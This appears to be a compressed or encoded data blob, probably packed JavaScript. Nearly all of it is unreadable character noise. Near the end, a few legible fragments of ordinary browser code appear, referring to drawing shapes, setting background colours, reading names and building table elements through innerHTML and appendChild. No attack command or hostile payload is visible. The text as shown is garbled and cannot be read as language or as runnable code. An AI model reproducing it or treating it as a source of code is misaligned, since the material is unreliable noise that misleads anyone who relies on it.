P}HoFM\\~GqK)M>MHI5VMLxMF}uGvTzHwh@HyOH{G~PcTzabFTFx[\\6Gq,tcU0O Jvu+c}ZF\r4ZHlHmGoPhFEM]FIJ#K,^1{&SyR]J5\\l?hc}|PE-L1Sg;y7ZK~Kwu)|qE5K6KzL4R\\E6i ~UZGX}|GYImFtNheQP`J~J|^u{F"b\'v~{Iw7zgHzab~^TsEJF$uEY}-v	pEYy<hyynpOEetzE]x:n@Eks>EdEf\'&{OGymp"EjEby<S)~pEel{hxS);srMEthxgTEep"KdKJGF=z!stxI?UYxYDFCKHGPmos{IGGzabIQW_FMFO]Fs}vFfO9IRFjUaQl|lHnW`FwK\'FzF}JPEzabMxIM>E%w	EO_HzOMBEF^TFh~EDF?~>U1U	KUD$E|\\rC~)EQ/_>FE"KmIJ(~D<|E\'L#E)D$qwE?S{jvF(ppKdD4N*EPF2ESsxDbELF8UlU(T^E}yD`DLq9DM-DNZJdN	hU1N^U^`^.Ndd*eQxDdLu}&?g8CvHd0HAF9Mq~ZKn}zfN8NWU}D#G"FdP~F8K\\OzFiM6FkQFYNzHGBvRFD&M3I]D\\IqWdD3N[V}VKRh\'VC@F{GtD1GwMDGyEM@E\nm>V1E\rF_E;DHJDJ~#D|g_IDO|Xc}qXV~cxEzpWI\\E#DZWED]J!FDaE`S8`[v}yDgEKLlFtDkhFDmJ~3Dp"DrCsDtJGU*DDyLD{E|DKUN"K,N%N_N\'B`P\rCPC\r^\'CCnCg;I:ClxlCCU_UKL[C$_DD&C(FgC*OG!^YQ:RM~nGM-~lWEH`i"xMPxC4|ojIaM}N~uC1}~pwB91q3HS_RMbt{\\vv}lG,b|zabvIVi"|8DVv`{\\uu~7tLx]X]E_!~#cY(BUzurAy|8mNpkppBHs;rr`CyBaYlG4HH HJG8]`ou|8p"GkRz#bBkZpy#|zaba!QV_IW(Pqtb}m5pMUTB7aWHgzGBB3mOE!FtK]CiTxbqWUD0D]FzCDNqChD>MBG|CLmkH}M6D MGKIjGGK[M6~3py0wyl}z|zabb~*sZgN$CylS^k*:A8a<UCN}uxtDBzabJ~!|uAwMz}/HYD)O;B)wIpMD/IAz^joAGsA!C9D=GxHxG{D@OCNCPDE`^Fa]% No\'V9cSYn_\\?Apo\'BLemZvSEEnsAqCabkuzFeMTWBAl`GA`g6|AzE3{*kl}FoVm;vBI=i%sSmlBHhi{bz@|.BkRQ{amk]`nGPuB0mqBH~lJxA@~{`PplF*F1I7W0C|A\rz@7F~eW	MC|lzM\rp[@F9}4DJA:EFAU5LYFFIe{^IC#FNuopOVAUVC|7EK@Hx\nUy U SJXxBH>{q?|Yv{j)h(x2Ds&z#BZF@ID}@PLTO3@UUIB!@Xuz@<B$P|x\nMH@Neg6k	y1TUHO<B"vtY~)AqFVGDG%ub@HO}F]P~Vm@j/AnO?{!p+\\6x7g8@2w9PPuvZp}QGnK(F[AUG D+MQz-[<Rw@H_szabRWOHROHB3?:vAIYBDHjAu)HnK"OYA}RmW`A_D:CEA"AdEAfE	DAG~A(UXA*Gy KXO7A/D!O<A3A5GAE|zab~go2A>J*U?N&j|h(5?kiPNay?AB~@ADk-zLGEALU,ANtAPDK\'fASGB\'AT?2AX?,C(C\'D_?HAH~PZA GuAbt\\?PD??SAhV{pAjfLU{a`AnBTBV[ev3AuaQtBU~7z}ugwBMG#C0QM/>&uBJJrJ4v>,wIIVFpbt>\'ZECSo>7_<>.@cx>;>!_vV>6hdEC\\AbcsIF]V\\v`?O(E$>A\\J^K,JkK0e>F-?lF/}E+E2@3@?}BU~lDh?JZENVDnN@;G$uF@>D5~|@@XWW\nVC|@`F:LHU)E?~CWBRqIGU5|_`LMgRMtSexMH`B0H=\'aLDyB	W9g/B^0g6kg8Y^6U?F"hHJ/N6e|Mtj|K>?v`?>c?&rF?bjbl?F\\nDD>F`C|aC&?-D(IQAV?1AnB<oi?C@=GoHoFzChCueQMJD7E>M?W{?TCJMECM>OcT>WDAnCdID`LcJ_IM<DZL*C>>S{Z#Z\rB0H>N[V>uEQJB@:I@	I<ZI?LN}s|8UNFJ*=NcB>bMhZCmCemv=g>IhhE9G4kJ\nx[iHWD?oy6NNHd7(igHN=%C!O<EV=<>	KfM[>YChF=fl<vH=i}]S1=leM=nJ@KDER>p=sj/C=vJY|wF={MC=~^/@ek>w`S` xxW<Hhg{^C7<KrN)h]jae^yLN^"<S<CKyCB<(Sz<\nsM<ZL{2;EN-<SlsNIW0<f>m<Te`<VV-<mB<\'<)<[<<]<wE7<Mz<\r<<lsWUhosG<jV;<@V<L>C6<"L"SwNME`(J<&x(<ZwQ<+x&WC<.xzab<0hFJAK>z<5AI>~Jt8i<9}soM<<E*@\r;<	I*E0<z<_B<}E:<<d<Le_Ph=<Jg<1<UFf-M;< ;=^<$>WJ\'Lk<v;5vp;~l3;ty;=L<2=q;#JD;%DvInP;)JKK,|;-?=<Ad+<Cx_<Eh<I~|;p;;yLR-<OC<QhQ<S<;x<gi8<u;0<^E.<~<@;zE8<~<ceq<f<hewn>N<r<t;{eehm<t<Y;1<x:;4:;6<a:\nE;<d^"<t<iexQ;	@}B JW;\rxC)D*C,D,B#U\\B+Pv?B6D.=G?FM:<m?_>A`>J`E>A$AgDB>CO=7K_|{q>D$>THpU?}u=K^\'J2G,fo^})wFz)0My1K0<;Z;"MO}uOI"C{|R9GJ;^K\rF<CUXejj=wOlwk_mXTE>WD_J^;g?iCCN\r9Nb<@?ekN:(e}NJ><!K):RGPl=Jo>4I)vp:X|-=D:\\:^:`:bI6<3<kR;h$uPAPhEP#39+x\n:gV|:kA-JEC:pU,P@x::uQd:wuP:yx\nCh:}Ki:<>oP?9%x:VMJ88NA2qCBNN\'9C\n==9ZP9\n;GL[:NC\';J@^^9N9I(ED9})v89\':_y7:aPK=p:dQ9#97y_EP9)9+q#Me>[UE~*OS9/:jTIIi93F;"ET9s99Y}U9<G9>;M9@J#>a9\rH!9\\L_9^iK9`:T9c:W:Y V59i9k\'9mx:cF3:\':f9}H\'yD?Z8:m948DPy\nQ[;c}s8\nP(8:{:AC:=N[9OAG9C~Sb:PsP82Gy#f8LP{c@{?9Y:0>=F==VkE>:L?I8g#8=}9iE9I,>5vH9fM/BP99l99o8&9-8)x&yzabg\nsKvvTIH,I;;&\\C95F>:r:tK}sX+z#9=8:=bM]>X9AEvZ\rOpJWJD\'@I988b9dSo8gVPmj8j8"8l>o<k8oOeN8rx9y 8v918yI8{eNE87,788~>:zCFO8=`9Bxzab8?98A<zabFB(8Q;9Z798]B?@	7y98cK}v8g9h79j99n7;9yI$K/9{9.7"8s7%908zab7(8/87-857/lI774776T 87Bvj:O99_7G8`9b78987O8!8#PR7SP7 :h7#8t8vG8-@IDu:o80J8H84@wY707fA8=eM7:9Q7<9Ud+#9J8=$;\n:*UXC-wUv%=4?/C+6:18U>	Fv;Gye;^=J07>TT>Z7Vh(6Jm@\r+7S{t9~GJ|60}(G,~VUsK}Vr\'My#{kP!K#66Q699;zab?sy^\'@+@EB8d9J8JuI0L~Kzab6J\'Say7AE<?xK\r6Fna~cg8|G>M06R/OpThu?axCJ*Wx^9^7e5^<`U?h=6W?uyg?wUF7]H	b"Y1BrR3oggw<?`nA46|C6~5yl;^9goU?656.9Vg0>mWVM;s<p?ny?9#Of:eux\nIvs}i!o2R;H%;W8bG,53jok`xIzJ7+D5<~B6pY|896sie7\r6%8TFbH]M.C3:7F66(:=M88;w	:T=MFW0D9UM>A%=S?Rl=UV=W>K_=[9[AO(7	E)<%D:6Nol=Cm_*Soo26En9;Vx@89!;\\HM:nKLJ45F;dn8~>C:h:5uE/<\\<R<|:;8;zabht&}Op6H[6\';J::E(=`7gw	M=7Mb94EEtzmi%5z;X>n@95~L4zab;\'nP4<9LO4)fm@{4	V4ug4\r<y4BvpC: ;9eq4W-499Z:,J 7i=aFL(5p4$:zab4=Cos#:&6dW94,;!8&";$<744JM:4=|C4<be;24:4A4r]<b:!4FUF&wm~!~d8RUZ4LJ[4=_HtFxfPD:4#L4T4ivp5wfk4*w=m5|;[F44_=u4aJL\ri$48784;;/E,4mln:>d4&4C4I6s~!X(E4z4C5L_4~;L5W35^3l;344Vn7s%s\'4+39p4^C4`t844;cLO37o5494f4\n35t4U4j4?4l34:4o4q4E}{;4t}Q3(<43+5m45o304S333J34W3Cs39F~7|ti37*]3@6y933e4e<=3Gek<\'3b]3<]3x:;7<3#&zrP3W7A:+;I:-B&:/5LKbu|{\\NNHL]F\'Io>PsHw>CK5a4 3/xU@Eri>C?7B/DSc>`@mG]YzabuYSSRsv%HgAuBlO/PsPtPEdK728nv@imq!3%H/Y4R#mNo {\\y#PrYp2({B=H}iZ23jqOBPrOWmq2K@&mkK{u#b9uY[2(5\rHGR3|G-Id/5K	nvmoY?QPFoJuw~|qi]232>2G~]2I|.!2PYka>fJ22%7B=h7J2?DEBA2 @DXI!tyMC2r2,O1U3@z{5BA?\\7@J2~21{12O}W\r?|lpO!1H9~l2u232x2zH9ka1jQ1q)1MS1=YK_11#29]INt1U*7>;-@bUxE}RpW9l"-UC5!yYy[y]9GAE{M7OW:?MC5cCI5b=RV?V1TIy|zab=;8M:k1A.gw>1^1A1I<1,YWY@vI@@yU;19R>12FhB(2I2}jQ1N1zab15jW171"k3s{Fn(1\'222I2tx2H1)|.1/^aQ A}(14BPU<K 188X1;uo=]WB1@G9VuP1D6C1FWWo1IN[1K1MyllW1Qy_1SFz1WA#G~5`1]2Uhu1`hd1b<\r1dTIIG1hGC71k7>C0@N3o=BL1u}wHiT02`5R4Bu5{2>D*4@C00zab001 Vj2HZ1<D%1%0	1(}Cmq1n0})2yz!u2|=,00aQ0e}-:IF01\n5k:Px0#Ot1CB	1E=1G0+P[0.N`1N01y^5l~1TPZ06:C08:EGz1^I<0m6p11t0BRh1xO=0;Ph1m02vH91pDK7.J=0R8w1wA.8SW]=@0_b.1+0y100h0>Az$}0m1*})}#0p}C00t2{v%p6|q001000}T61	DW/K)/N[M0\'U/	0*p/s1L/001P/041Uk]/CHAe1X1\\H|/%10H999j/Ij>10DC /4/s0K/J/v1qah/y/0RfR=0UIdG3Y3R3@0ZHM/}1y>3X/81/:/P0010j0>B0\n/C0o/(1-})00v\\$0x.0d01=8/V0iIN/Y0"NqP[0/5"d+N1TU0(/`1H1A/\rN\'BA/g~02/z/Ps/m1Y/o09/r0H0=tc=.0@g0/!1f0Etc1i//\'0qF0M1r0ODO2/01eIKG/~0HI<0L.Ol/zI_y$Rg.	0W.0YHK0[/3.0^4J11~(0b/Q.1!/>./@m6.!|./Gmq.&/L12/O0c0z.,190~./0 1.3NoW9.6K10J/^@c/\nT\n/cyr/e.A//h1R?v{I05?MNq07CJ/q//s//uuQc/xJ.b.U/|=)K\\.h7*/G/+=7c-60Q.U.e./$-<;_I}b+.kQd.m0S.o.80V.G5..u.-:2	/6.z1}0w/9/;16/S-z?!/1e8~\'~)E~T<F|4@U]TIId=w\'y1Yj|PWD]=T{Ol/}]~}C91|S-z\\:-vKK=XDiD91T2-sZXR|91J,kr}H|4v%\\6{\\X:rN|T?",T@|P\'5_4\'-i|;~groVC:[|R,KmWpw~Wht1y ,),5~5,,,.,0,8i^5t1}g3,@s,7d,9,-o,<,G,>T},/,L7,C.W2"B5dBC?569v6;v5^m`N?`m}XLU{At~h25yc.\'Hh-\rpF/</SW?.0Ds40$.8G7*~5czg4bCZ1vC/#0`-_.*--b,pC%0~h1.+,oU.0=]0I0%~C8syJ?}hk85Fab[uZ/t7.wF3T{L.G,k|Q?:kT2:91R00\\7l.(+-,n.-c,k5t7KLyJ9nIL;Lml5;+7MtfLL<c"mq~#f,a3G,,]U=E-^,l+\n.+ADtA[,teQ.9I<zz+D+O3SQLU}hjGA0a.+/-a+1+N>>80	,[+66`J:L+?+:nG+<+k+8LQLU:+BNJxF+ivp+GBh?+J+	++M+D1+RWl,v-Ix]+y7O3C~H8.|.~.0{y<.+f+SQ2Y*oJ2=Mnl~3}b+I+-+K*1!+e/X9+,uO,7*Of* {XM.R,R.JU.f-]+J.}+a.*0g*(? vSdzabd0	OFBQ>R|oAZOeL"O|0TT0RABq.sBt-W5A1vM[eu@\n;iP8CPPhQ6\nwuov\nfLaG~"y1,;8736z5A5?g}~Kxb~|G}NcPG1iFO{\\aBW{FBY`t2E}i9}-42p}*|qo6B]sB_aBb~^Be\\P2D|;)\\b{EZk;)y<x%tyB\\6.) ynp+*IvTyeT2*l5PX6B5@I|s*w=Z`kWF|W}U\\ZCU0\'|*|}{v	}`O+\\k8);AQ)>xv	5Yh5\'N-iH89RF+gxJ-?q-3v|993)49~}q)?:m*yD-_l~q]*"ZYQ^*\\kn`]L@vtS&l{,q~oOQ)qZb:X{TEXimdqXFqpFQ}$Y[DaU^<HP[O)[=Pxz	:[?e12~~K9|7/DS4}$K	b2@6=GIpOY*L,}KY*7(M:eu)*A5AJ5Ah:~tLrq891AxKB9T;jeQ?	y2iH35+x\nu#~\\p1YZY\'.:|uO~\\P(zabY\'1da~UJ(@(:t)`a\rEW|yk+)qV!]olYvQ)sEY&mK9@_ppE>9~|\\mu2ZK}|kLybk]>%pp_(,UjRp0(G[}4(PPYFvE2TWCFz.M//n?Qx7:G?*j1zab=a|=(tC6-x&i\'wIW5X{HzablG[|qSDW"{7Cr|oW5R	^ywD{d\'-TBs2fwOnu!ym|") C|\\+4Js(gI/+lL}]v	,\\C(UpppOL5\'/+=L:+t\'3~p}{p_1t0	\':6_Mr+l6FkR\'@\\CfBub\'9(`W\'0nIKQt3\\"\\Cq#\'C//A\'-J4\';+rK>g\\S\'W=E\'Z\'[m6\'Fy\'<y	J<~zv	\'Aff(r\'D.\'j\'StzJxI\r\'p\\CBB\'szFfV}=7\'C~\'3+)&xOWC23\\/lIi7)-Ix+y)}+BLK1Z.xlZ0[5|8ezNZ79hUih(FCY;G4:eNjoW|?tNQie:oV5h=iH&#PaI[}?\\/7,Yub|q\'2Q\'g(syF=>\'\r|ou6_1?4a+_jry(XM)mue&=\'B=b(mC}1>UVJtl}(x))|`=A\'+:3?DK \'/}=@/4\'+&I*@``h,,Z,hk]l:5?@FP2~++0*\'*6!*/+C}\rpyL7+X/!6*\',.-`/R+d&yH\\(n&o~COE:5?>p=2%&sQ:,l*-/W3*J &|*,+,wX6V/m\'/-=JR5*6-FFO/N*+L-*?bM+2SOD})Se2Y%6y0L7(cQPy%%	-zab0fIo0i+*+T7*ye~\\~SJ}b/!-E=)%,+`%@*=*5Nu>C|FrB7R8kctf}R}g/r)h)}~hy$SEQsE|mszab%fg%h|	XDilrCXG}b(axy1&O5R%%%/%B%13ZVkD0%F*K\rwWx:\\w=z5-h.wO=+zab%&v+c%0%*@/@-.|%S%(R)$ImeM1l*.~$[4$	1v$( O}>{(+Q%+S$U)$w\\w<;5Id$$\'.*:$+$Fc%Vm6BE%ZfO\\"XT@~7,~TYY2]cUkhS*wP2N|Zq ~*0T8NmIeRDIg?[)&u+b%\n&x0-&z.21?WE$+*0&/.<xOuxdrwh6*`hB%h5/0t}^~1O.D/i-\'KJ-)U23OJ=J9zab;<$~dX`!h<;|CBV\rV\n%IV<rN0P<;xhx\nCNM?5d/pG}OF5?EVm=[IM[i=/ZmkA?;<NmhB]WV~it6jU)xy#)\'d>)$j)<5-9L)=1vM`Rk}/ez?X#9%*U_A*;Hd4}WBN{&$e;81T#>O5|R$%C #B4Ke#EI#G#$Gg0~hu#L/1$~?\\#Q2#DA[#Fmk#WxzabOu#Z#[DG#9%?](L\n#DE#O(#g#!$#h#Y~K#KD.U$4D#9\r+#eC83.6>wX,E.^\\1$C~T3$Flt,(rTu=(Y=._L\rTT/0":rln}(".,(>~t@k}.U8"",E@o$P++1=]tF"&@r"}a1q"T@""*y,E"wF"l=U2wIE-N~h"" &"",6"%1"\'gT"K",NIIx"/I"#UCg>W"5l"7/,x("HE0""z"grpd"@BiE"C\'lv	M"9"\\l"!"<"c"M"O"):r|2"R".$56#r:9#Oc*W*K#x.3#z1\r#|~L#~#m#M-xA.#a"V-"X&~"s|z"8"`}&"q"wVC"I""VC2<SA"IFy9U2~pAx!m!T@"#~5!"<!rF|7My) .LD*3[imM$e"WU#V"Z7*X!"!((d})"K!-EA$B"w~\\6=h@^D{w!"(-M"!El!*|!M!.!LFT|f!2\'!4!6H!9{( !<*Ch"[VC!D"*!\\!+l!Im:!G"r!^6>""j!S""F"ne!o|!qs!Ylt !!3)!:!7!e"U$\r};#s=Z!zabFwi=#I<\rDYUNm~#\\#52LY#P"7l0!!X1a(42($~`/*Y uP:iHN{hgy\'e588*JL!}";!,3jWxs?xAK!B{Fm.^"i A>4K!=x#Gx7g %*gWu66{}*.< +/\\7> .hU 0~|}jP^ 3 4DqKO 7"a"<~\\i^ ;}{ =;^ ?! A C:v3E~<"}/YK) J $0? & \'5)+ *fL$ - /gm [h& 3( _ 6!W?"b :U: g >5A @~W m9:"j~W F&hqL 5h #wezab #Z/!9M,~	 HLi!?"#}@i"!!>WE v}= x!&iE @,AY;b[!;#, I"Y\' U5#)1AW%Ue-[C"+,%d$$\\%A0|+2}fl.)K%T%&W3[ ,%!-I+&+-A%\',|#M-9%qw$8$$]%BNVq&mjJYA.=A1z`1Q_`,eGfn&};Q_A]6]_Ka ^O&tPu}$*F{!^Lx|yS(t9.}/,~pN>r|oanSviD}-hkzabXZV#/xO#1u#3W^Sz"t1$jR%_Yj&~DcW	XUXZXX~)t(\'X\\Z=z^~deh2\'!R3<[^>]*>\'#I9v}!UVg^C1ETns$jy#$mW1w0W^^Dtl{#l+FIGgyGxVA*Sb}3di\'j\'FMs=d}JEed:_zNfzabdfeH0|X^2z"i>W#YSj\n[P3?2-tx")rF)tYcH?Q-HDU%z]%ZPNQ3|z4&tx~D}o4mY0b$dxsH$lU~/U}a]!w/Z{(X}2lGK_jHb5cBQ,ZqM"$E"*$Hb;x\\!~&2!!}Q<\\*G|o",S+Qc,&)~){"~t,,+[mW Ayj,,6:@!M,,mW dF6h(,"cIo LR :,NGm_w^}-"!,E$Eng.]t2\'p ca~)Q9\rzH!K!pi\\"YM(n\\CsW{ W^R{|4OifwIxg}swRd|^EjcVkj|#RRdUzZ3sdC"*~(70~	\rY5<l$X,Xw4~m grrvm ~{m\\WoZ`I{=`\\l):rxEdyc9[~Ztk8~5|{}oT)t%S ,j+u(=\\e$KL\nr>~\rx}Xl~Xs9lkQ(n3	"y1~\\}Wr* 98u}\npO3	"E$RP|4R:!]U\'t~CO]n zab~;}\nz%Qe%jZdxerF=Y\nQrMy#2wpkWD{bU`k\\qbhizt<Nm~pq~7Nm~e"~$xzabsc~Z`rrBrGjtAtBR ZtHG}bS |qWW`Li"clQ?[1]\n\'QZCSZG.R\ng>=6]L1,oaSs{xKx4S[ltgRK8I-~4oyHZlKzab~^~~m<\rlQRziKZ,8-S\\/ezabH[yuwxv[SB~<R}WT;Rol\\`Lz:`}\n"dQUQ}=\rij}}Rr{o6tv-=CXZtZ$hl2y)5`=XFQZ_Z@~CmC0T6,~Sg|:k~5r}/z`.H-PR,$TT2f-||x~]	w~4-~!87q$\nZaR<Ia,~\r2So:`bd{a\'zt1n0S3,Z{\'vL0dkb&w[z(}lu[T\'cjf	kU0	GR!D-~ Qx?\'{+zCr}qOkau?S] @|f{0{:O3@Fk#T[>Env,&IXK&l0j[w2y)Zn}M$RT/8Kz5BKG.c6[mz5z%kRU{0|=}W^Fy<!bv3x`p}HwG1}Kg6WS`kMkR~%gs6xTkMkykPk}_e<2S{oG,_wIGFZ	*zabGLCbt2k&(Nf}M7<$I>ki@w#Q:"QbtE(DH$L[^$D=?oBD :G">J,HM\\PU^U`X e,NcS%a?X*Y,fjRK>%y|l!~5}joyY5\\^E,/+5S>j<F,13{T3+gdfj"Et!Hzx&z:s|bG,_br|J *v |S	$u)\ny{m-cbm*>8e`]] z[jZk)~*6n&?ppM"**,~Dk_c3a[?%}Uw,}\n{\\PXs/kOh+v?2k\\kb\rr\'YT%#!y5Gq?V>xU}h+Z,j1nqns&Z|.kz\\bIskj1oYu.,!OY(#kk_*L[h+{L/=Od=Hyg~<6zo})[c_+jxlD,o{("fLEr:j[uug<\nj,rM6#1{/4}\nO;h+YIvZt!dwt@tx5y8:rS,F-kSr>V|"*NziP=i>IY>;9,\'eAgE{dH_N2CGbs&yBdgr@VU!qi~<o\\vz[|&s#"ev`\'.Xv	i chaYjvz#a2OP~0|h6GK}w<MryWMh+|4%W2"fD2 z*nsby0}R{I/G{EzB[OW9 /N?r(kO6Ytf?"k|"hVAEc!U&:i-O.|R|7(.iZX2#8}wfi)@CXDN(In Qo2A.<OKEAP[h,*M|i~23lU-~2-LY6A<i!)@H}\ne3n7TTA>B/_DJFH X ^-{/iML$V.\ru\'_8.=uWUy(|4NLUDN[_^\'Tn:s#"kzRIcq@k/hU,j8>mJ 5q.p$Ts1HIfw @I/T2G\rtpV|8}rASV 	*m~`?e R/_Y7d{Iyb)!#%+\'")x2K.n/6SP*	Zy127.W\nZh{D23YT"Tf\\=}UT)~Ylw.2,]x LrR?RAu!H\r$X-xuESzab~3TiSTlTnS	TpSb"S\rTu8xmQZTkSTPToXLs)xO6vTDSyT<{STQ~S\\ST[7*}3[fzabXK.ql}}QT`T\nRXI[OXWU#e\\*!@9u=w}oy~*dC9|ns2;t!w0>*ZA$AEGG?1M\\luA=y<HYCU[WMZN e][oKUN{dcRM]mW_yjZ=ggTv|GNP2|h*CzH#h{d|HM( /Si[zzd3}WNL(I@-P}-3V_5bc7Q.;H |=;~\'?KIkgL$MfgF]bz@;QC@~7>QO\\RWgZRXQS\\ga0c)b{`jM1QwjMwWU}bpcNJT8iLv@vS\\qfss8e_f8$Avz2,At#5{ Bf^\\=a[z.e> @*vp4CsHTH|=jh]M(L~tZV,x{F!luONzab,<D1"GBGtc]qw(p`u!/w~)Z0	e!RwmQ$B}"w \n}458hcV|#1R)|!eY!)p+sENg.S{E],S ]%)Q\'Xd_#bzabGXjbsw0a_.E]b~xNQ?0+(Y{<jXp0CBmMbYIa[}wp/zab& k"\r\\")Sv"-Q1~CQ!8}v0}3BFz69~VF}3W3xV<ZRHS_]p_k,R>Pqw|\'.3yG$@R&|]Y}9L8\n}]%|_t1\'^.rG5^u&|~FM~Y}t1{lBywUIh6!\'>iE13</3:4]y<HA38~>Dz|Wo4^*k|zG-Bg{A.e~eDy\\+QN\\s7N%\rlni%>.1C( "_"t23\r3h4.F4(-X#[w;Kgd=&C.zYeK!sW#4Z&@BR<8/,~#.@1)I4F$U$Ww(C <W&In&(5-MVVO[G,Ej&9C"G\nty[OI<%1qS<RU3p:I\n|2v	;6obRgNw-9ezxWXT!~3S!RcUyWr[)qJ_zQ+!7R-R@uH|RIdt8LUtL7)p|#kT8ySSpTR~TVuSTJ{FTjBSD\'KFWSTZrt?TMoN\nTqwQI<Z5<lp_7f9SJ&Nwmb|4wQbQ(giU"rb_1kG`hQAcc9/zHuU3%YeM	bI7+~vQ28:Yw1_0:2&b~S(kQCv-\\f1tjSE*rP4PAyxPCx(vLPHPJ8$PL!|?\'9n#PTJX	Tb%[<!{I+hljR7R8R:0Td2Ig}v	YI-gr>pO(pYB-w}\nHKJ|h\\6S:x:}W@L,SAd}{ftXX>*hb#L7Ut	%Lj&Xo(ni()[$H{D|pX)qM%]w~zj$|hx`/$TK6RE],a^Cl-.p(7Rj128qGI\\m~(~Q&VsVu]q2mzab|:\nbtqw"!_:6~2;fzgM5<~!2ow0"h|xj08W(9Dx:~zr`SJ[W0Col?^z1F\n/oqT7?~z{!u<G]>`@q;>@>#w:rak0FbJ:OLVNT[T#VrVT\\*fw-/%[fPc9+Fhlk{!\r6<yxD$by,&G,}R}THm5\rcm~)VXdrs~h!pa<>-\'\\jRtbhEf\r\nKvQ"b\rE!do$[]Ws9#}fmgocq^s~Brb\r9wQ:]E\rB^M\rFZ4sxE]Ezabbo6Hqa!,&"\r3yS)4UQ37:x<B9" {&%~!$VPPR\riQ\r_9d(d$~|,R?.SIZU/ k6SZ<aUkYiBkIQSYJ}NQ aGY.m XzEk|^R*Itx@Ms6tyq> |f)(&I|fZv5<jo)<;c"lZlA~DQcG>bi%T({I(4^W#i>}ukw,"}Q,<5y<~oX6%b`C\\|\\oWqY~)WDq]SfU*6 49CyG<jX?~B\'ErWF"}`H0mg~kM`DRNpPAw5b7VE#8=x[]_rHOnd\n2T8~tY{&u^@YexN=8R@3\'/GZl,M2It1	3 (xQt6S (Y.WaI@E.)b_$Gs$JZ ,Z4~+?XqWPUTvW&z^,Y,T%W0\nB^v|{y+}6"rXu>G*l\nK{x?"bO>"sb\r.D\r1lJ2ut BY>t12*8D^Gh+uP902d]?y\rpK/rG$\n]}f8VC84c%3/)ldJ?lN}MpR;uXay(Z=_hbEgm62*fj EHzabG]Qkk0	\n q d\r#!H\n%T\n(ufj_\n,!u\n.YT@C"\\[-\r~SH3a*!NzabjXaW*~3munG\rks:|aVPYI.}3Y[`Q*\rr\rtp2I{{|h\\vu[YXjalX%Ddk-imb]\r2*\nfu ^R`k$\rH+(\nw\ntv\nn"#~z(zkqksGLi"E?Q?zYe,ZL5\nzxhM\ni	z#zHjzab:3YIu%t*/u\nA,sdj%qStu-	\r\nL{V[Ymk1(fc,)]*(g\\8LEs9_kV!jD	,or	.0	0	2{F_fL	5]%o"	+JsXsy;L5Xs	1D{FF~!	Colo\'	Jw]FI*	K	>	Mt	Aj|	QR8r=n\n#ma6eg}fj8{f7z[jVLLU]z	FwRz	8pR{{1T 8>Q"	pYvrmkYE5|dw	?t	OjkqKvS[v"lhiKx%{<\n]	@T|5P\\P.7pc\r	.GIP^	V\nVv)(GbP^ORaqpD	dsz5x	q.SX(gc.|:	v	r?w]	zn]\'B)	2&z,&	7vG^Nd+z2B	Z	\\x%^+v<_{+{iTNQ#U&W)h&c?-wQrk`n5z	{I	}~!vR8ZVwQ\\w_,1O,+(\n[e(\n^uX:RTbI\nc5_\nz|\nqu\nu\nh\n`Sz\ng\n{d\n}&P*$y\nfjj$(ue}@L5/	L	3e_	Cvtvz%wX	[Tb_	{`;@W4	N	4\'N8=g$Zj$v`?\nub/~(1{f>hs9BMu :&ZH@	BKv`CPbw|PNa,[ZT7QvQ\nk\rZ4bZ$[sdxqL\n=tdx-sP"(qx@ td3y{]n&\\) *$BvS.xr{p~pV<"0?Y}U|# >(*QG5(.)w.$:_ .0/K	|#YI SIttL|{X	"J~	(x@B9AF)B_g4f]`nB9^ewu3LY	tOX3zzQsMw\nYF\n1F]r~\r\\|ExTL\nd|l}8G)u@\\=W^, MwY\rCOyvm5qqk92X*#H!qv5[XJ,%{*EcLMwbujg}W&)n#[@{wpCzuc9qxotY/sXbB<\'c/ZwQ|}MR:zab!\\:vKs&t#\r\\:3vQBO>:a:"[`	5t<{~R~T)i3,:\'X GeE\ni5}%7Mh3|"<|v>K3Az+OMs\'/d<?NdA	m\'(4W\rt(Wt>lzfb#h	bOpOy)[k^y	`7b]OQ(Y>yj,Z$|BR~Q,rxYvWl{!5	b5r|4BS[G@uFplkuFbt-n*w$5>8b1N\'":3,iOL<;QS{	R+\'7\r(>GEDHG^P	.Row=U*Hdt	?^va	|>L\rWHSf.px}lqoZcw0t{i\rTr	uH{&T<FVbugTHuo\nE|T.|bOz>`@YQoo{IvpC"pl5;\npf*=7\r~c;H{q,pC>9Sfp[:6+82\noGIu}5{D*\np&-d6!qNA*[Ql{S#{"5X?ZJm6]{pRy=c_RRQa1+gt"(wA\'hly1^]tzba}x>M_f_~}fmn`npzab\'r}xMRLnZkK\\P9}-;,knopk, t\ncVzgu}%t\\Y>p	!Qvm [b^S$33&';tsbfqL7Y1vskxn[4]='t- Math.floor(allShapes[num].start));\n ~&~\'~(~)~&else if (cd == 2)~%~*~>~)~lLin~~~~~~t~7 nw +~3~A~C~E~~~~~~ ~~~~~	~~\r~~U~F~X~I~[~!~#~=~?~>~,~. ~l~m~m~ACurv~f~H~Z~K~M~O~Q~S~~v~x~z~Y~J~\\~~~~~\n~~u~w~y~W~{}~j~$~s~&}~r~(}~?~.lectedtd~\'o\']~~u~~$~r}~\'~o~/~1~3i}"m~}#o~Dg~7=\'z\'~<~({}~\'f~~3v~~0=0;~0 <~&~X}:d}<ng.}}Z~}Qi++}D~>}F}~0~2(~> -1}d~s}f}g~\'}} }"}$}&[}A}*[i~~D~ErHTML~M\'\'~R~O}}s~&}Lr~N},}9r};}=}}]||\r |~N~~~%10|"||\r|~5~M}j}m|m)/|!|#}G}}5~4d~8}o|1}g~A~~}~z~Ddex~~w|$~s|8}|H}t~,}v}#}%}\'}B]|~Zy}.backgroundCo~	|~9\'wh}7e\'|F~\'}1~*}u}!|N}y}{}+~9~}.}0~r}V|}X}=~M[|~r|tbl~M}%.p}:ntNo|A{\n{{{e|$|3{l.~gName{oLowerCa~.()!}@~{|k) {{{{|{\r{|A|${5~9{{8e{:{|$}Xc~{Bt|W{y.|mo~yC|ild({~k~)|3|j||}Z}?\'p}C |t~wn|$|m~M}P~r}I|(|i{l}`}S|+|;~s}`}b}p }r~*|3|:~{y|}?|~{}~?co{\r~Du{|8|~6~9z|<~}~~|~ }zabzzzti{ |m~&|3{k}Tdz	~>{k~9d|$|o {o}K}M{s~9}P}R}T~X~e{z~0{|~r{{Z}i~T~D~F}~z|x{|| zA~V|S}~X>}n zHzJ~dzBz~{BdzO}nz(~*zz\r~z~?z~MzKzC~h~}~RzfzW{z zb~>z${vz\'|J~&z* z,|z~(z0{qz2{tz6|+}}{{}cz=|8z}}zgzE}-lz]~)z_zzaz"|}MzzTlyzgz~Lzjy}zlzz!y}iz%zwy~(zvzx|I~(|q~M$(\'to~ly!{2}/~(|3q{.zF{3q.|zab{\'|||\'}zabd1(|,~$}f|_}!iz }ss~X{Wzsz>{|e{4d{A{C{{{9{{<~r{r{a{{